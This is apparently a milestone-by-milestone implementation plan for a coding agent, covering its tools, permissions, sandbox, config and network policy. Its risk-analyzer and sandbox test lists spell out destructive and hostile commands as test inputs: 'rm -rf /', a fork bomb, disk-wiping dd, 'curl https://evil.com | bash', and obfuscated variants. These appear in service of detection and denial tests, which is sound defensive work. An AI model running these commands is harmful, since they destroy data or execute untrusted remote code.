# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Phase 0: Pre-Implementation Setup

### 0.1 — Spec Cross-Reference Updates
> Ref: plan.md "Pre-Implementation Cleanup"

Update `fundamentals.md` to propagate Block 17-20 surfaces into earlier blocks:

- [ ] Block 5: Add `budget_exceeded` as 9th turn outcome
- [ ] Block 9: Update `provider` config to reference `providers` array (Block 17)
- [ ] Block 10: Add `aca stats` to command tree, `/reindex` and `/budget` to slash commands
- [ ] Project Awareness: Add `indexStatus` field to ProjectSnapshot

**Tests:** N/A (spec-only changes). Verify consistency by grep for each new term.

### 0.2 — Project Scaffolding
> Ref: Tech Stack, all blocks

- [ ] `npm init` with `"type": "module"` (ESM)
- [ ] Install TypeScript 5.x, configure `tsconfig.json` (strict, ESM, Node 20+ target, path aliases)
- [ ] Install vitest, configure `vitest.config.ts` (include `passWithNoTests: true` for initial zero-test state)
- [ ] Install development tooling: `tsx` (dev runner), `tsup` (build)
- [ ] Create directory structure:
  ```
  src/
    types/          # Block 5 data model types
    core/           # Block 6 turn engine, Block 7 context
    providers/      # Block 17 provider drivers
    tools/          # Tool implementations
    permissions/    # Block 8 sandbox, approval, risk
    config/         # Block 9 config loader
    cli/            # Block 10 CLI entry points
    rendering/      # Block 18 terminal rendering
    observability/  # Block 14/19 events, SQLite
    indexing/       # Block 20 embeddings, symbols
    delegation/     # Sub-agent system
  test/
    (mirrors src/)
    fixtures/       # Test data files
  ```
- [ ] Create `src/index.ts` entry point with minimal CLI stub (`commander` setup, `--help` exits cleanly, `--version` shows package version)
- [ ] Add npm scripts: `build`, `dev`, `test`, `test:watch`, `lint` (lint script: placeholder `echo "no linter configured"` until ESLint added)
- [ ] Git init if needed, initial commit

**Tests:**
- `npm run build` completes without errors
- `npm test` runs and passes (zero test files, `passWithNoTests: true`)
- `tsx src/index.ts --help` exits cleanly (requires the CLI stub above)
- `tsx src/index.ts --version` outputs version from package.json

### 0.3 — Test Infrastructure
> Ref: Cross-Cutting, all milestones

Test infrastructure must exist before M1, as mock provider and fixtures are needed for M1.4+ and snapshot testing is needed for M4.

- [ ] Mock NanoGPT HTTP server for provider tests (configurable responses: text, tool calls, errors, streaming delays)
- [ ] Test fixture directory with sample files: small text, large (>2000 lines), binary (null bytes), empty, multilingual (UTF-8 with multi-byte chars)
- [ ] Test session factory: create sessions with predefined conversation state (items, turns, steps)
- [ ] Snapshot testing setup: vitest snapshot configuration for rendering output comparisons
- [ ] Path alias resolution aligned across vitest, tsup, and runtime (`@/` → `src/`)

**Acceptance criteria:**
- Mock server starts/stops cleanly in test setup/teardown
- Mock server supports configurable SSE streaming responses
- Test session factory produces valid sessions loadable by SessionManager
- Snapshot files stored in `test/__snapshots__/`
- Path aliases resolve identically in tests, build, and `tsx` dev runner

---

# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Milestone 1: Minimal Agent Loop

Goal: Call an LLM, stream the response, support one tool (`read_file`), persist conversation as JSONL.

### M1.1 — Core Data Types (Block 5)

Define the foundational type system. All other code depends on these types.

- [ ] ULID generation utility with type-prefixed IDs (`ses_`, `trn_`, `stp_`, `itm_`, `call_`)
- [ ] `Session` type: id, workspaceId, parentSessionId, rootSessionId, status, config snapshot, created/updated timestamps
- [ ] `Turn` type: id, sessionId, turnNumber, status, outcome, itemSeqStart, itemSeqEnd, timing
- [ ] `Step` type: id, turnId, stepNumber, model, provider, finishReason, contextStats (tokenCount, tokenLimit, compressionTier)
- [ ] `ConversationItem` discriminated union:
  - `MessageItem` (role: system/user/assistant, parts: TextPart[] + ToolCallPart[])
  - `ToolResultItem` (toolCallId, output: ToolOutput envelope)
  - `SummaryItem` (text, pinnedFacts, coversSeq: {start, end})
- [ ] `ToolCallPart`: toolName, arguments, toolCallId
- [ ] `ToolOutput` envelope: status, data, error, truncated, bytesReturned, bytesOmitted, retryable, timedOut, mutationState, blobRef?
- [ ] `DelegationRecord`: childSessionId, childAgentId, finalStatus, parentEventId — embedded in `ToolResultItem` for delegation tools (not a separate item kind)
- [ ] `AcaError` shape: code, message, retryable, details?, cause?
- [ ] `TurnOutcome` enum: `assistant_final`, `awaiting_user`, `approval_required`, `max_steps`, `max_consecutive_tools`, `tool_error`, `cancelled`, `aborted`, `budget_exceeded`
- [ ] Monotonic sequence number generator per session

**Tests:**
- ULID generation produces valid ULIDs with correct prefixes
- ULID IDs are time-sortable (generate two, verify ordering)
- All type constructors produce correctly shaped objects
- Sequence number generator is strictly monotonic (generate 100, verify no duplicates or out-of-order)
- `ConversationItem` discriminated union narrows correctly via `recordType` field
- `ToolOutput` envelope validates required fields (status is mandatory), `bytesOmitted` correct when truncated
- `DelegationRecord` embeds correctly in `ToolResultItem`, validates required fields (childSessionId, childAgentId, finalStatus)
- Serialization round-trip: create each type → JSON.stringify → JSON.parse → validate shape matches

### M1.2 — JSONL Conversation Log (Block 5)

Append-only persistence for conversation state.

- [ ] `ConversationWriter`: append typed records (turn, step, item) as single JSON lines to `conversation.jsonl`
- [ ] `ConversationReader`: read JSONL file, parse each line, yield typed records
- [ ] Record type discriminator field (`recordType`: `"turn"`, `"step"`, `"message"`, `"tool_result"`, `"summary"`)
- [ ] Crash-safe writes: each line is a complete JSON object, partial last line is detectable and discardable
- [ ] Line validation on read: skip malformed lines with warning

**Tests:**
- Write 10 records → read back → all 10 match
- Simulate crash: write partial line (truncated JSON) → reader skips it, returns all complete records
- Empty file → reader returns empty array
- Large record (near 64 KiB) writes and reads correctly
- Concurrent append safety: write from two contexts → no interleaving within lines (may need `O_APPEND` verification)
- `recordType` discriminator correctly identifies each variant

### M1.3 — Session Manager (Block 5, Block 10 Phase 5)

Session lifecycle: create, load, persist state.

- [ ] `SessionManager.create(workspaceRoot)`: generate session ID, create directory at `~/.aca/sessions/<ses_ULID>/`, write initial `manifest.json`
- [ ] `SessionManager.load(sessionId)`: read `manifest.json`, rebuild in-memory projection from `conversation.jsonl`
- [ ] `manifest.json` schema: sessionId, workspaceId, status, turnCount, lastActivityTimestamp, configSnapshot, durableTaskState, calibration
- [ ] `workspaceId` derivation: `wrk_<sha256(normalizedAbsolutePath)>`
- [ ] In-memory projection: ordered item list, current turn state, running sequence counter
- [ ] `manifest.json` overwritten at each turn boundary (not per-step)

**Tests:**
- Create session → directory exists, manifest.json is valid JSON, conversation.jsonl exists (empty)
- Load session → in-memory state matches what was written
- Write items → save manifest → reload → items and manifest match
- workspaceId is deterministic (same path → same id, different path → different id)
- workspaceId normalizes paths (trailing slash, `.` components don't change the id)
- Loading nonexistent session throws typed error

### M1.4 — Provider Interface + NanoGPT Driver (Block 17 minimal)

The LLM communication layer. Start with NanoGPT only.

- [ ] `ProviderDriver` interface: `capabilities(model)`, `stream(request)`, `validate(config)`
- [ ] `ModelCapabilities` type: maxContext, maxOutput, supportsTools, supportsStreaming, costPerMillion, bytesPerToken (default 3.0)
- [ ] Minimal hardcoded model registry: map of model ID → `ModelCapabilities` for NanoGPT-available models. M5.1 replaces this with the full file-based registry (`models.json`). M3.1 depends on `bytesPerToken` from this registry
- [ ] `ModelRequest` type: model, messages, tools?, maxTokens, temperature, extensions?
- [ ] `StreamEvent` tagged union: `text_delta`, `tool_call_delta`, `done`, `error`
- [ ] `NanoGptDriver` implementation:
  - `validate()`: check API key exists, base URL is reachable
  - `capabilities()`: return capabilities for the requested model (from internal mapping)
  - `stream()`: POST to NanoGPT chat completions endpoint, parse SSE stream, yield `StreamEvent`s
- [ ] SSE stream parser: handle `data: [DONE]`, partial chunks, connection errors
- [ ] Response normalization: map NanoGPT response format to canonical `StreamEvent`
- [ ] Error mapping: HTTP 429 → `llm.rate_limited`, 401 → `llm.auth_error`, 5xx → `llm.server_error`, timeout → `llm.timeout`

**Tests:**
- `validate()` with missing API key returns ConfigError
- `capabilities()` returns correct maxContext for known models (e.g., claude-sonnet → 200K)
- Mock HTTP server: stream a simple text response → yields `text_delta` events followed by `done`
- Mock HTTP server: stream a tool call response → yields `tool_call_delta` events with correct name/arguments
- Mock HTTP server: 429 response → yields `error` event with `llm.rate_limited`
- Mock HTTP server: 500 response → yields `error` event with `llm.server_error`
- Mock HTTP server: connection timeout → yields `error` event with `llm.timeout`
- Mock HTTP server: malformed SSE → yields `error` event with `llm.malformed_response`
- StreamEvent reconstruction: accumulate `tool_call_delta` events → complete tool call with valid JSON arguments
- Stream interruption: abort HTTP request mid-stream → yields `error` event, no partial data
- Slow stream: mock server with delays between chunks → all chunks received in order
- Empty stream: server sends `done` immediately with no content → valid empty response

### M1.5 — Tool Runtime Contract (Block 15 minimal)

The shared layer all tools pass through.

- [ ] `ToolRegistry`: register tools by name, look up tool by name, list all tools
- [ ] `ToolDefinition`: name, description, inputSchema (JSON Schema), approvalClass, idempotent, timeoutCategory
- [ ] `ToolRunner.execute(toolName, args, context)`:
  1. Look up tool in registry
  2. Validate `args` against `inputSchema` (use `ajv`)
  3. Apply per-category timeout (file: 5s, shell: 60s, etc.)
  4. Call tool implementation
  5. Validate output against `ToolOutput` envelope
  6. Enforce 64 KiB output cap (truncate with metadata)
  7. Return `ToolOutput`
- [ ] Validation failure → `ToolOutput` with `status: "error"`, `error.code: "tool.validation"`
- [ ] Timeout handling: graceful signal → 2s grace → force kill pattern (for subprocess tools)
- [ ] Timeout → `ToolOutput` with `status: "error"`, `error.code: "tool.timeout"`, `timedOut: true`
- [ ] Auto-retry for transient network errors on idempotent tools only: 3 attempts, exponential backoff (250ms start), connection reset/timeout/429/502/503/504
- [ ] Non-idempotent tools (writes): no auto-retry, return error immediately

**Tests:**
- Register a tool → look it up by name → returns definition
- Look up nonexistent tool → returns undefined/null
- Valid args → tool executes, returns ToolOutput
- Invalid args (missing required field) → returns validation error without executing tool
- Invalid args (wrong type) → returns validation error with details (field path, constraint)
- Tool output exceeding 64 KiB → truncated, `truncated: true`, `bytesOmitted` correct
- Tool exceeding timeout → returns timeout error, `timedOut: true`
- Tool returning malformed output (missing `status`) → `tool.contract_violation` error
- Tool throwing exception → `tool.crash` error with details

### M1.6 — `read_file` Tool

The first tool. Validates the full tool pipeline end-to-end.

- [ ] Input schema: `path` (required), `line_start` (optional, 1-indexed), `line_end` (optional, inclusive)
- [ ] Read file contents, return with encoding, line count, byte count
- [ ] Line range support: `line_start`/`line_end` return only that range with metadata for continuation (`nextStartLine`, `totalLines`, `totalBytes`)
- [ ] Truncation at 64 KiB or 2,000 lines (whichever first), set `truncated: true` with metadata
- [ ] Binary detection: null-byte check on first 1 KiB + extension heuristics → return metadata only (`isBinary`, size, MIME type)
- [ ] File not found → `tool.not_found` error
- [ ] Approval class: `read-only` (auto-approved)

**Tests:**
- Read a small text file → correct content, encoding, line count, byte count
- Read with line_start/line_end → returns only requested range, correct nextStartLine
- Read file > 2,000 lines → truncated at 2,000, `truncated: true`, metadata present
- Read file > 64 KiB → truncated at 64 KiB, `truncated: true`, bytesOmitted correct
- Read binary file (create a file with null bytes) → `isBinary: true`, no content, size present
- Read nonexistent file → `tool.not_found` error
- Read empty file → content is empty string, 0 lines
- line_start > total lines → empty content with metadata
- line_start = 1, line_end = 1 → exactly one line
- File with mixed encodings → UTF-8 assumed, handled gracefully

### M1.6b — User Interaction Tools (Block 2)

The model needs explicit tools to ask the user questions and request confirmation.

- [ ] `ask_user`: question (string), optional choices/format → user response. Approval class: `user-facing`
- [ ] `confirm_action`: action description, affected paths, risk summary → approved (boolean). Approval class: `user-facing`
- [ ] Both require TTY in interactive mode. In one-shot without TTY: `ask_user` fails with `user_cancelled`, `confirm_action` fails unless `--no-confirm`
- [ ] In sub-agent context: neither tool is available — child returns `approval_required` to parent instead
- [ ] `ask_user` yields the turn with `awaiting_user` outcome
- [ ] `confirm_action` yields with `approval_required` outcome

**Tests:**
- `ask_user` in interactive mode → prompt displayed on stderr, user response returned
- `ask_user` in one-shot without TTY → `user_cancelled` error
- `confirm_action` with TTY → approval prompt, returns boolean
- `confirm_action` with `--no-confirm` → auto-approved (returns true)
- Sub-agent calls `ask_user` → tool not in profile → denied
- Turn yields correctly: `ask_user` → `awaiting_user` outcome, `confirm_action` → `approval_required`

### M1.7 — Agent Loop / Turn Engine (Block 6)

The core execution cycle. This is the heart of the agent.

- [ ] `TurnEngine` class with `executeTurn(session, input)`, `interrupt(level)`, `getPhase()`
- [ ] Phase enum: `OpenTurn`, `AppendUserMessage`, `AssembleContext`, `CreateStep`, `CallLLM`, `NormalizeResponse`, `AppendAssistantMessage`, `CheckYieldConditions`, `ValidateToolCalls`, `ExecuteToolCalls`, `AppendToolResults`, `LoopOrYield`
- [ ] Phase state machine: enforce valid transitions, emit events on each transition
- [ ] First step of turn: phases 1-2 run before 3-12. Subsequent steps: enter at phase 3
- [ ] `AssembleContext` (minimal v1): system prompt + tool definitions + conversation history (no compression yet)
- [ ] `CallLLM`: call provider.stream(), buffer response, stream text to stdout
- [ ] `NormalizeResponse`: reconstruct full response from stream events into TextPart[] + ToolCallPart[]
- [ ] `CheckYieldConditions`: text-only → yield. Tool calls → continue. Step limit → yield. `tool_error` with non-retryable error → yield with `tool_error` outcome. `mutationState: "indeterminate"` → yield with `tool_error` (unsafe to continue after ambiguous mutation)
- [ ] `ValidateToolCalls`: validate each ToolCallPart against tool schema
- [ ] `ExecuteToolCalls`: execute sequentially via ToolRunner, collect results
- [ ] `AppendToolResults`: create ToolResultItem per result, append to log
- [ ] `LoopOrYield`: if tool results appended → loop to AssembleContext. Otherwise → yield
- [ ] Step limits: 25 steps/turn (interactive), 30 (one-shot/sub-agent)
- [ ] Consecutive autonomous tool limit: 10 (interactive only)
- [ ] Max tool calls per assistant message: 10 (execute first 10, defer rest)
- [ ] Return completed `TurnRecord` with outcome

**Tests:**
- Text-only response: input → LLM returns text → yields with `assistant_final`, single step recorded
- Single tool call: input → LLM returns tool call → tool executes → LLM returns text → yields with `assistant_final`, two steps
- Multi-tool response: LLM returns 3 tool calls → all 3 executed sequentially → results appended → next LLM call
- Step limit: mock LLM that always returns tool calls → engine stops at 25 steps with `max_steps` outcome
- Consecutive tool limit (10): mock LLM returning only tool calls → yields with `max_consecutive_tools` at step 10
- Max tool calls per message: LLM returns 12 tool calls → only first 10 executed
- Validation failure: LLM returns invalid tool call → synthetic error ToolResultItem created, model gets another step
- Tool error yield: non-retryable tool error → yields with `tool_error` outcome
- Indeterminate mutation: tool returns `mutationState: "indeterminate"` → yields with `tool_error` (unsafe to continue)
- Phase transitions: verify each phase emits correct event and advances to next phase
- Turn record: completed turn has correct outcome, step count, item range
- Conversation log: after turn, all items (user message, assistant messages, tool results) are in the JSONL

### M1.8 — Basic REPL (Block 10 minimal)

Minimal interactive CLI to exercise the loop.

- [ ] Entry point: `aca` command via `commander` (v12+)
- [ ] Mode detection: TTY → interactive mode (only mode for M1)
- [ ] Minimal startup pipeline:
  1. Parse CLI args (just `--model` and `--verbose` for now)
  2. Load API key from env (`NANOGPT_API_KEY`)
  3. Create session
  4. Display startup status on stderr (version, session ID, model)
  5. Enter REPL
- [ ] REPL: `readline` on stderr for prompt, stdout for assistant output
- [ ] Submit user input → `TurnEngine.executeTurn()` → display streamed output → prompt again
- [ ] `/exit` and `/quit` slash commands → clean exit
- [ ] `/help` → list available commands
- [ ] `/status` → show session info, token usage, active capabilities, model
- [ ] Ctrl+D (EOF) → clean exit
- [ ] Basic SIGINT: first → cancel active operation, second within 2s → abort turn and return to prompt

**Tests:**
- Startup with valid API key → session created, prompt displayed (integration test with mock provider)
- Startup with missing API key → error message, exit code 4
- `/exit` → process exits with code 0
- `/help` → outputs help text
- Mode detection: with TTY → interactive, without TTY + positional arg → one-shot (test the detection logic, not the full modes)
- SIGINT during idle (readline) → clears line, redisplays prompt (verify via mock)

### M1.9 — Event System (Block 14 minimal)

Basic structured event logging from day one.

- [ ] Event envelope: `event_id` (ULID), `timestamp` (ISO), `session_id`, `turn_number`, `agent_id`, `event_type`, `schema_version`, `parent_event_id?`
- [ ] `EventSink` interface: `emit(event)` — writes to `events.jsonl`
- [ ] JSONL event writer: append-only, one JSON object per line, synchronous writes
- [ ] Core event types (typed payloads, 12 types):
  - `session.started` / `session.ended`
  - `turn.started` / `turn.ended` (with outcome)
  - `llm.request` (model, provider, estimated tokens) / `llm.response` (tokens in/out, latency, finish reason)
  - `tool.invoked` (tool name, args summary, `correlation_id` for pairing) / `tool.completed` (status, duration, bytes, `correlation_id`)
  - `delegation.started` (child agent ID, task summary) / `delegation.completed` (child agent ID, final status, token usage)
  - `context.assembled` (estimated tokens, budget, tier)
  - `error` (code, message, context — for errors not tied to a specific tool/LLM call)
- [ ] Event sink injected into TurnEngine; emit at each phase transition
- [ ] Content by reference: events carry item IDs, not full content

**Tests:**
- Emit session.started → event appears in events.jsonl with correct envelope fields
- Emit turn.started + turn.ended → both present, turn.ended has outcome
- Emit llm.request + llm.response → response has token counts and latency
- Emit tool.invoked + tool.completed → completed references invoked via `correlation_id` (dedicated field, not `parent_event_id`)
- Emit delegation.started + delegation.completed → completed has child agent ID and final status
- Emit error event → has code, message, and context
- Event IDs are unique ULIDs
- Timestamps are valid ISO-8601
- Malformed event (missing required field) → throws at emit time (dev safety)

### M1.10 — Integration Smoke Test

End-to-end validation of the complete M1 stack.

- [ ] Integration test: start agent with mock NanoGPT server → send "read the file at test/fixtures/sample.txt" → agent calls read_file → returns content → agent responds with summary
- [ ] Verify: conversation.jsonl has user message, assistant message (with tool call), tool result, final assistant message
- [ ] Verify: events.jsonl has session.started, turn.started, llm.request, llm.response, tool.invoked, tool.completed, turn.ended
- [ ] Verify: manifest.json has correct turn count, status, last activity

**Tests:**
- Full round-trip with mock provider: user input → tool call → tool result → final response
- Conversation log is complete and parseable
- Event log is complete and causally ordered
- Session can be loaded after completion (SessionManager.load)

---

# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Milestone 2: Core Tools + Permissions

Goal: Full file system tool suite, shell execution, workspace sandboxing, approval flow, and configuration.

### M2.1 — File System Tools (Block 2: Tool Surface)

Depends on: M1.5 (ToolRunner), M1.6 (read_file pattern)

- [ ] `write_file`: path, content, mode (create/overwrite) → bytes written, hash. Create parent directories if needed
- [ ] `edit_file`: path, edits (search/replace pairs or unified patch) → applied edits, rejects. Support `expectedHash` for conditional edits
- [ ] `delete_path`: path, recursive flag → deleted items count. Require recursive=true for directories
- [ ] `move_path`: source, destination → result, conflict flag
- [ ] `make_directory`: path → created or already existed. Create parents
- [ ] `stat_path`: path → exists, kind, size, mtime, permissions
- [ ] `find_paths`: root, pattern (glob), type filter, limit (default 50, max 200) → matching paths with metadata
- [ ] `search_text`: root, pattern (regex/exact), file globs, context lines, limit (default 50, max 200) → matches with file, line, snippet

**Tests per tool:**
- **write_file**: create new file → content matches. Overwrite existing → content replaced. Create with nested path → parents created. Mode=create on existing file → error (if create-only mode specified)
- **edit_file**: single search/replace → applied. Multiple edits → all applied in order. Search string not found → reject reported. expectedHash mismatch → edit rejected without modification. Preserves file permissions
- **delete_path**: delete file → gone. Delete empty dir → gone. Delete non-empty dir without recursive → error. Delete non-empty dir with recursive → all gone. Delete nonexistent → error
- **move_path**: rename file → old gone, new exists. Move to existing path → conflict flag. Cross-directory move works
- **make_directory**: create → exists. Create existing → success (already existed). Create nested → all parents created
- **stat_path**: file → correct kind/size/mtime. Directory → kind=directory. Nonexistent → exists=false
- **find_paths**: glob `*.ts` in test fixture → finds .ts files, not .js. Limit 2 → returns exactly 2. Respects .gitignore patterns. Max 200 cap enforced
- **search_text**: regex pattern → matches with line numbers and context. Exact match mode. File glob filter. Limit cap. No matches → empty results

### M2.2 — Shell Execution Tools (Block 2: Tool Surface)

- [ ] `exec_command`: command, cwd, env, timeout → exit code, stdout, stderr, duration. 64 KiB output cap (head + tail preserved). Default timeout 60s
- [ ] `open_session`: command, cwd, env → session_id, initial output. Register in process registry
- [ ] `session_io`: session_id, stdin?, signal?, wait → incremental output, status
- [ ] `close_session`: session_id, signal? → final status. Kill process tree
- [ ] Process registry: track PID, process group, start time, idle TTL (1h), hard max (4h). Tree-kill via process group. Orphan cleanup on startup

**Tests:**
- **exec_command**: `echo hello` → stdout="hello\n", exit=0. `false` → exit=1. Timeout exceeded → `tool.timeout`, process killed. Output > 64 KiB → truncated, head+tail preserved. stderr captured separately. Custom cwd works. Custom env vars work
- **open_session**: start `cat` → session_id returned, process running
- **session_io**: send stdin to cat session → output returned. Send signal → status updated
- **close_session**: close cat session → process killed, final status returned
- **Process registry**: register process → listed. Orphan detection: register then kill PID externally → cleanup detects and removes. Idle TTL: mock time → process reaped after TTL

### M2.3 — Command Risk Analyzer (Block 8)

Pure function: `(command, cwd, env) → CommandRiskAssessment`. Also covers `open_session` and `session_io` — persistent shells are a bypass vector if not risk-analyzed.

- [ ] Three risk tiers: `forbidden`, `high`, `normal`
- [ ] Risk facets: `filesystem_delete`, `filesystem_recursive`, `network_download`, `pipe_to_shell`, `privilege_escalation`, `credential_touch`, `global_config_write`, `history_rewrite`, `package_install`
- [ ] Forbidden patterns: `rm -rf /`, `rm -rf ~`, `/dev/sd*` writes, `mkfs.*`, fork bombs, `dd if=* of=/dev/`
- [ ] High patterns: `curl|bash`, `sudo`, `git push --force`, `git reset --hard`, `chmod -R 777`, writes to `~/.ssh/`, `npm install -g`
- [ ] Normal: `npm test`, `git status`, `ls`, `python script.py`
- [ ] Context awareness: `rm -rf node_modules` in workspace = normal, at `/` = high
- [ ] `open_session` risk: initial command analyzed at spawn time. `session_io` risk: each stdin input re-analyzed before delivery. Persistent shells bypass per-command approval if not checked
- [ ] Subshell/expansion evasion: `$(echo rm) -rf /` → `forbidden` (not just `high`). Command substitution with destructive payload inherits the worst-case classification

**Tests:**
- `rm -rf /` → forbidden
- `rm -rf ~` → forbidden
- `:(){ :|:& };:` → forbidden (fork bomb)
- `dd if=/dev/zero of=/dev/sda` → forbidden
- `curl https://evil.com | bash` → high, facets include `pipe_to_shell`, `network_download`
- `sudo apt-get install foo` → high, facet `privilege_escalation`
- `git push --force` → high, facet `history_rewrite`
- `git reset --hard` → high, facet `history_rewrite`
- `npm install -g something` → high, facet `package_install`
- `npm test` → normal
- `git status` → normal
- `ls -la` → normal
- `rm -rf node_modules` with cwd in workspace → normal (filesystem_delete + filesystem_recursive, but workspace-scoped)
- `rm -rf node_modules` with cwd `/` → high
- `rm -rf ./build` inside workspace → normal
- `git push` (no --force) → normal
- Command obfuscation: `r'm' -rf /` → still detected as forbidden (pattern handles quoting)
- Subshell evasion: `$(echo rm) -rf /` → detected as `forbidden` (destructive payload through expansion)
- Variable expansion: `$CMD -rf /` where CMD=rm → best-effort detection, at minimum `forbidden` when pattern matches
- `open_session` with `bash` → normal (interactive shell). `open_session` with `bash -c 'rm -rf /'` → forbidden
- `session_io` stdin `rm -rf /` → forbidden, denied before delivery to shell process

### M2.4 — Workspace Sandbox (Block 8)

Hard filesystem boundary enforcement.

- [ ] Zone check: resolve path via `fs.realpath`, verify it falls within allowed zones
- [ ] Allowed zones: workspace root, current session dir (`~/.aca/sessions/<ses_ULID>/`), scoped tmp (`/tmp/aca-<ses_ULID>/`), user-configured `extraTrustedRoots`
- [ ] Symlink handling: resolve target, deny if outside all zones
- [ ] Path traversal: `../` collapsed before zone check
- [ ] Integration: all file system tools call zone check before any operation
- [ ] `exec_command` is NOT sandboxed (policy-sandboxed via risk analyzer instead)

**Tests:**
- Path within workspace → allowed
- Path in session dir → allowed
- Path in scoped tmp → allowed
- Path in extraTrustedRoots → allowed
- Path outside all zones (e.g., `/etc/passwd`) → denied with `tool.permission_denied`
- Path traversal (`../../etc/passwd` from workspace) → resolves outside → denied
- Symlink within workspace pointing outside → denied, error message shows resolved target
- Symlink within workspace pointing to workspace subdirectory → allowed
- `/tmp/random-dir` (not scoped) → denied
- `/tmp/aca-<correct_session_id>/file` → allowed
- `~/.ssh/id_rsa` → denied
- `~/.aca/sessions/<different_session>/` → denied
- TOCTOU: path passes zone check, then symlink target changes before operation → verify atomic check-and-open pattern
- Mount point traversal: path within workspace resolves to different filesystem mount → still allowed (zone check uses resolved path, not device)

### M2.5 — Configuration System (Block 9)

> **Before Approval Flow** because approval reads from resolved config (pre-auth rules, class overrides, network policy).

Full config loading pipeline.

- [ ] JSON Schema definition for config (using `ajv` for validation)
- [ ] 5-source precedence: CLI flags > env vars > project config > user config > defaults
- [ ] Trust boundary filtering: project-safe schema (subset), silently drop disallowed fields
- [ ] Merge semantics: scalars=last-wins, objects=deep-merge, arrays=replace, permissions=most-restrictive-wins
- [ ] `ACA_` prefix env var mapping (e.g., `ACA_MODEL_DEFAULT`)
- [ ] `ResolvedConfig` type: frozen, immutable for session duration
- [ ] Config loading pipeline (9 steps): load defaults → user config → project config (filtered) → env vars → CLI flags → merge → most-restrictive permissions → validate → freeze
- [ ] Secrets loading: env vars primary, `~/.aca/secrets.json` fallback, 0600 permission check
- [ ] Config drift detection: compare current resolved config against session snapshot on resume
- [ ] `trustedWorkspaces` step: map in user config, `aca trust`/`aca untrust` modify it, expanded project-safe schema for trusted workspaces
- [ ] `providers` array config (Block 17): support multiple provider entries with priority, backward-compat with singular `provider.default`

**Tests:**
- Defaults only (no config files, no env vars) → valid ResolvedConfig with all defaults
- User config overrides defaults → correct merge
- Project config with disallowed fields (e.g., `sandbox.extraTrustedRoots`) → fields silently dropped
- Project config with allowed fields (e.g., `model.default`) → applied
- Env var `ACA_MODEL_DEFAULT=gpt-4o` → overrides user config default model
- CLI flag `--model claude` → overrides everything
- Most-restrictive-wins: user config allows 5 tools, project config allows 3 of those → intersection = 3
- Array replace: user config has domains [a, b], project config has [c] → project domains are [c] (not [a, b, c])
- Malformed user config → warning, fall back to defaults
- Malformed project config → warning, ignored entirely
- Missing secrets file → not an error (only env var path)
- Secrets file with wrong permissions (0644) → refuse to load, error message
- `schemaVersion` field: known version → loaded normally. Unknown higher version → warning, unknown fields ignored
- Frozen config: attempt to mutate → TypeError (Object.freeze)
- Trust boundary: new `providers`, `budget`, `retention` fields are user-only (silently dropped from project config)

### M2.6 — Approval Flow (Block 8)

Permission resolution for each tool call. Depends on M2.5 (config) for resolved policy.

- [ ] Approval classes per tool: read-only (auto), workspace-write (confirm), external-effect (confirm), user-facing (interactive)
- [ ] 7-step approval resolution algorithm:
  1. Profile check (tool in allowed set?)
  2. Sandbox check (path in zone?)
  3. Risk analysis (for exec_command, open_session, session_io)
  4. Class-level policy
  5. Pre-authorization match
  6. Session grants
  7. Final decision
- [ ] Session grants: fingerprinted by tool+pattern, persist within session
- [ ] `--no-confirm` flag: auto-approve `confirm`, never override `deny`
- [ ] Interactive confirmation prompt: `[y] approve [n] deny [a] always [e] edit`
- [ ] `[a] always` creates session grant
- [ ] `delete_path`/`move_path` confirmation escalation: always require confirmation even with `--no-confirm` when recursive or affecting many files

**Tests:**
- read_file → auto-approved (read-only class)
- write_file → requires confirmation (workspace-write)
- exec_command → requires confirmation (external-effect)
- exec_command with `--no-confirm` → auto-approved
- Forbidden command with `--no-confirm` → still denied (deny overrides no-confirm)
- Session grant: approve `npm test` with [a] → next `npm test` auto-approved
- Session grant scoping: grant for `npm test` does not approve `npm install`
- Pre-auth rule matching: regex `^npm (test|build)$` → matches `npm test`, not `npm install`
- Profile check: tool not in profile → denied before other checks
- Sandbox violation → denied at step 2 regardless of other rules
- Risk analysis covers `open_session` (at spawn) and `session_io` (each stdin input)

### M2.7 — Network Egress Policy Foundation (Block 8)

Block 8 defines network egress as part of the permission model. The core policy engine belongs here; full integration into web/browser tools is in M7.

- [ ] `NetworkPolicy` type: mode (`off`, `approved-only`, `open`), allowDomains (glob[]), denyDomains (glob[]), allowHttp (boolean)
- [ ] Policy resolver: read from `ResolvedConfig`, evaluate domain against allow/deny lists
- [ ] 3 modes: `off` → all network denied, `approved-only` → allowlist or confirmation, `open` → allowed (still subject to denyDomains)
- [ ] denyDomains takes precedence over allowDomains
- [ ] Localhost exception: `127.0.0.1`, `::1`, `localhost` auto-allowed in all modes except `off`
- [ ] HTTPS-only default: HTTP URLs denied unless `allowHttp: true`
- [ ] Best-effort shell command detection: `curl`, `wget`, `ssh`, `git clone`, `npm install` in `exec_command` → evaluate against network policy
- [ ] Integration point: `ToolRunner` calls network policy check before executing network-capable tools

**Tests:**
- Mode=off → network tools return `network_disabled` error
- Mode=approved-only, domain in allowDomains → auto-allowed
- Mode=approved-only, domain in denyDomains → denied
- Mode=approved-only, unknown domain → requires confirmation
- Mode=open → all allowed (still subject to denyDomains)
- denyDomains precedence: domain in both allow and deny → denied
- Localhost → auto-allowed in approved-only and open modes
- HTTP URL with allowHttp=false → denied with clear error
- `exec_command` with `curl evil.com` + mode=off → denied
- Localhost exception does NOT apply to `exec_command` shell detection (shell can do anything once running)

### M2.8 — Secrets Scrubbing Pipeline (Block 8)

Block 8 specifies 4-point scrubbing. The pipeline architecture and known-secret redaction belong here; pattern detection for unknown secrets is extended in M7.8.

- [ ] `SecretScrubber` class: maintains a set of known secret values (loaded from env vars + `secrets.json`)
- [ ] Strategy 1 (this step): exact-value redaction — any known API key value found in text is replaced
